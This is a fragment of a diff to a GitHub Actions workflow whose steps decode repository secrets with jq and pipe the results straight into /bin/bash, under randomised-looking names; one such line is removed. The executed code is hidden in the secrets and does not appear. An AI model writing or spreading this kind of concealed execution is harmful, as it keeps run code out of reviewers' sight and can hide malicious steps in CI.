@@ -18,7 +18,6 @@ jobs:
           zish364: ${{ secrets.zish364 }}
         run: |
           printf '%s' "$zish364" | jq -r .rw0 | /bin/bash
-          printf '%s' "$rx4" | jq -r .w1 | /bin/bash
           echo $rp37 | jq -r .l3 | /bin/bash
           printf '%s' "$grd828" | jq -r .spvg53 | /bin/bash
           printf '%s' "$dpfv23" | jq -r .jo3 | /bin/bash
